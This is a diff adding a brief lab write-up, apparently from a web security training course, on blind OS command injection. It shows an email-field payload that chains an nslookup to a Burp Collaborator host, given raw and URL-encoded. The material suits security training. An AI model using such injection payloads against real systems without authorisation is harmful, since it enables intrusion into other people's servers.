@@ -1,0 +1,14 @@
+Lab #4 - Blind OS command injection with out-of-band interaction
+
+Target Goal - Exploit blind OS command injection to issue a DNS lookup to Burp Collaborator
+
+Analysis:
+
+modify the email to contain the following payload
+
+exploit@exploit.com & nslookup 4x2b9ii83cgxez6wrybgw4x6fxlo9ex3.oastify.com #
+
+url encoded it with crl+u
+
+exploit%40exploit.com+%26+nslookup+4x2b9ii83cgxez6wrybgw4x6fxlo9ex3.oastify.com+%23
+
